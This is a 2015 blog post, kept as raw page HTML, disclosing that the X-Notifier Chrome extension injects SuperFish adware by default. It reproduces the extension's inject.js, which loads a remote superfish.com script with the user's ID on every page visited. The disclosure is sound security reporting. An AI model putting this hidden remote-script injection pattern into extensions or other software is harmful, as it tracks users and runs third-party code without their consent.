<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="You probably already heard about SuperFish around the web, an adware that Lenovo pre-installed on its computers since mid-2014. The danger does not reside inside the adware itself, that basically just">
<meta property="og:type" content="article">
<meta property="og:title" content="SuperFish AdWare Found Inside X-Notifier Browser Extension Code.">
<meta property="og:url" content="https://www.evilsocket.net/superfish-adware-found-inside-x-notifier-extension-code">
<meta property="og:site_name" content="evilsocket">
<meta property="og:description" content="You probably already heard about SuperFish around the web, an adware that Lenovo pre-installed on its computers since mid-2014. The danger does not reside inside the adware itself, that basically just">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://www.evilsocket.net/images/2015/02/Schermata-2015-02-20-alle-18-22-34.png">
<meta property="og:image" content="https://www.evilsocket.net/images/2015/02/Schermata-2015-02-20-alle-18-22-05.png">
<meta property="article:published_time" content="2015-02-20T17:39:05.000Z">
<meta property="article:modified_time" content="2015-02-20T17:55:15.000Z">
<meta property="article:author" content="Simone Margaritelli">
<meta property="article:tag" content="malware">
<meta property="article:tag" content="adware">
<meta property="article:tag" content="superfish">
<meta property="article:tag" content="chrome">
<meta property="article:tag" content="xnotifier">
<meta property="article:tag" content="x-notifier">
<meta property="article:tag" content="extension">
<meta property="article:tag" content="browser">
<meta property="article:tag" content="inject">
<meta property="article:tag" content="adv">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://www.evilsocket.net/images/2015/02/Schermata-2015-02-20-alle-18-22-34.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon.ico" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico">
          
        
    
    <!-- title -->
    <title>SuperFish AdWare Found Inside X-Notifier Browser Extension Code.</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="evilsocket" type="application/atom+xml" />
    
<meta name="generator" content="Hexo 5.2.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">~/</a></li>
         
          <li><a href="/atom.xml">rss</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/fuzzing-with-afl-fuzz-a-practical-example-afl-vs-binutils"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/rubertooth-a-complete-ruby-porting-of-the-ubertooth-libraries-and-utilities"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.evilsocket.net/superfish-adware-found-inside-x-notifier-extension-code"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.evilsocket.net/superfish-adware-found-inside-x-notifier-extension-code&text=SuperFish AdWare Found Inside X-Notifier Browser Extension Code."><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.evilsocket.net/superfish-adware-found-inside-x-notifier-extension-code&title=SuperFish AdWare Found Inside X-Notifier Browser Extension Code."><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.evilsocket.net/superfish-adware-found-inside-x-notifier-extension-code&is_video=false&description=SuperFish AdWare Found Inside X-Notifier Browser Extension Code."><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=SuperFish AdWare Found Inside X-Notifier Browser Extension Code.&body=Check out this article: https://www.evilsocket.net/superfish-adware-found-inside-x-notifier-extension-code"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.evilsocket.net/superfish-adware-found-inside-x-notifier-extension-code&title=SuperFish AdWare Found Inside X-Notifier Browser Extension Code."><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.evilsocket.net/superfish-adware-found-inside-x-notifier-extension-code&title=SuperFish AdWare Found Inside X-Notifier Browser Extension Code."><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.evilsocket.net/superfish-adware-found-inside-x-notifier-extension-code&title=SuperFish AdWare Found Inside X-Notifier Browser Extension Code."><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.evilsocket.net/superfish-adware-found-inside-x-notifier-extension-code&title=SuperFish AdWare Found Inside X-Notifier Browser Extension Code."><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://www.evilsocket.net/superfish-adware-found-inside-x-notifier-extension-code&name=SuperFish AdWare Found Inside X-Notifier Browser Extension Code.&description=&lt;p&gt;You probably already heard about &lt;strong&gt;SuperFish&lt;/strong&gt; around the web, an adware that Lenovo pre-installed on its computers since mid-2014. The danger does not reside inside the adware itself, that basically just injects some advertisment inside user web searches, but in the fact that, in order to handle HTTPS search engines ( Google ), it installs a root CA on the computer and replaces every HTTPS certificate sent by the web server with this one, leaving the victim vulnerable to SLL man in the middle attacks.&lt;/p&gt;
&lt;p&gt;As soon as I heard the name “SuperFish”, it suddenly was somehow familiar to me … “Where the hell did I hear this name before?”&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      
    </div>
  </span>
</div>

    
    <div class="content index my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline" style="text-transform: uppercase;">
        SuperFish AdWare Found Inside X-Notifier Browser Extension Code.
    </h1>



    <div class="meta">
      
    <div class="postdate">
        <time datetime="2015-02-20T17:39:05.000Z" itemprop="datePublished">2015-02-20</time>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/adv/" rel="tag">adv</a>, <a class="tag-link-link" href="/tags/adware/" rel="tag">adware</a>, <a class="tag-link-link" href="/tags/browser/" rel="tag">browser</a>, <a class="tag-link-link" href="/tags/chrome/" rel="tag">chrome</a>, <a class="tag-link-link" href="/tags/extension/" rel="tag">extension</a>, <a class="tag-link-link" href="/tags/inject/" rel="tag">inject</a>, <a class="tag-link-link" href="/tags/malware/" rel="tag">malware</a>, <a class="tag-link-link" href="/tags/superfish/" rel="tag">superfish</a>, <a class="tag-link-link" href="/tags/x-notifier/" rel="tag">x-notifier</a>, <a class="tag-link-link" href="/tags/xnotifier/" rel="tag">xnotifier</a>
    </div>


    </div>

    <div class="addthis_sharing_toolbox"></div>
  </header>

    <br/>
  

  <div class="content" itemprop="articleBody">
    <p>You probably already heard about <strong>SuperFish</strong> around the web, an adware that Lenovo pre-installed on its computers since mid-2014. The danger does not reside inside the adware itself, that basically just injects some advertisment inside user web searches, but in the fact that, in order to handle HTTPS search engines ( Google ), it installs a root CA on the computer and replaces every HTTPS certificate sent by the web server with this one, leaving the victim vulnerable to SLL man in the middle attacks.</p>
<p>As soon as I heard the name “SuperFish”, it suddenly was somehow familiar to me … “Where the hell did I hear this name before?”</p>
<a id="more"></a>

<p>And there it goes, I have the <a target="_blank" rel="noopener" href="http://xnotifier.tobwithu.com/"><strong>X-Notifier</strong></a> browser extension installed on Google Chrome, wich is very useful to handle multiple gmail accounts at once without using a desktop email client, this is its options panel:</p>
<p><img src="/images/2015/02/Schermata-2015-02-20-alle-18-22-34.png" alt="xnotifier options"></p>
<p>Look at the bottom left of the picture …. there you go, the extension offers an optional ( but turned on by default ) SuperFish injection :D</p>
<p>When enabled, you will find this request for each page you visit:</p>
<p><img src="/images/2015/02/Schermata-2015-02-20-alle-18-22-05.png" alt="superfish request"></p>
<p>And here’s the code ( xnotifier/js/inject.js ):</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  chrome.extension.sendMessage(&#123;<span class="attr">msg</span>:<span class="string">&quot;enabled&quot;</span>&#125;,<span class="function"><span class="keyword">function</span>(<span class="params">response</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(response.enabled)&#123;</span><br><span class="line">      <span class="keyword">var</span> script=<span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">      script.type=<span class="string">&#x27;text/javascript&#x27;</span>;</span><br><span class="line">      script.src=<span class="built_in">document</span>.location.protocol + <span class="string">&quot;//www.superfish.com/ws/sf_main.jsp?dlsource=xnotifier&amp;userId=&quot;</span>+response.uid+<span class="string">&quot;&amp;CTID=xn-cr&quot;</span>;</span><br><span class="line">      <span class="keyword">var</span> h=<span class="built_in">document</span>.getElementsByTagName(<span class="string">&quot;head&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">      h.appendChild(script);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>Fortunately the server seems to be down, but the domain itself is still active:</p>
<pre><code>Registrant Org: Superfish Inc. is associated with ~1 other domains
...
Domain Name: SUPERFISH.COM
Registrar: GODADDY.COM, LLC
Sponsoring Registrar IANA ID: 146
...
Updated Date: 21-sep-2014
Creation Date: 16-oct-2005
Expiration Date: 16-oct-2017
...</code></pre>
<p>So, apparently, Lenovo is not the only to use SuperFish services, that btw is not only an adware, but a whole company selling ads.</p>

  </div>
  <a target="_blank" rel="noopener" href="https://www.patreon.com/bePatron?u=6065463" data-patreon-widget-type="become-patron-button">Become a Patron!</a><script async src="https://c6.patreon.com/becomePatronButton.bundle.js"></script>
  <br/>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">~/</a></li>
         
          <li><a href="/atom.xml">rss</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://www.evilsocket.net/superfish-adware-found-inside-x-notifier-extension-code"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://www.evilsocket.net/superfish-adware-found-inside-x-notifier-extension-code&text=SuperFish AdWare Found Inside X-Notifier Browser Extension Code."><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://www.evilsocket.net/superfish-adware-found-inside-x-notifier-extension-code&title=SuperFish AdWare Found Inside X-Notifier Browser Extension Code."><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://www.evilsocket.net/superfish-adware-found-inside-x-notifier-extension-code&is_video=false&description=SuperFish AdWare Found Inside X-Notifier Browser Extension Code."><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=SuperFish AdWare Found Inside X-Notifier Browser Extension Code.&body=Check out this article: https://www.evilsocket.net/superfish-adware-found-inside-x-notifier-extension-code"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://www.evilsocket.net/superfish-adware-found-inside-x-notifier-extension-code&title=SuperFish AdWare Found Inside X-Notifier Browser Extension Code."><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://www.evilsocket.net/superfish-adware-found-inside-x-notifier-extension-code&title=SuperFish AdWare Found Inside X-Notifier Browser Extension Code."><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://www.evilsocket.net/superfish-adware-found-inside-x-notifier-extension-code&title=SuperFish AdWare Found Inside X-Notifier Browser Extension Code."><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://www.evilsocket.net/superfish-adware-found-inside-x-notifier-extension-code&title=SuperFish AdWare Found Inside X-Notifier Browser Extension Code."><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://www.evilsocket.net/superfish-adware-found-inside-x-notifier-extension-code&name=SuperFish AdWare Found Inside X-Notifier Browser Extension Code.&description=&lt;p&gt;You probably already heard about &lt;strong&gt;SuperFish&lt;/strong&gt; around the web, an adware that Lenovo pre-installed on its computers since mid-2014. The danger does not reside inside the adware itself, that basically just injects some advertisment inside user web searches, but in the fact that, in order to handle HTTPS search engines ( Google ), it installs a root CA on the computer and replaces every HTTPS certificate sent by the web server with this one, leaving the victim vulnerable to SLL man in the middle attacks.&lt;/p&gt;
&lt;p&gt;As soon as I heard the name “SuperFish”, it suddenly was somehow familiar to me … “Where the hell did I hear this name before?”&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2021 Simone Margaritelli
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">~/</a></li>
         
          <li><a href="/atom.xml">rss</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


<!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-22026549-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Baidu Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'evilsocket';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


<script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-4da572964da15ce9" async="async"></script>

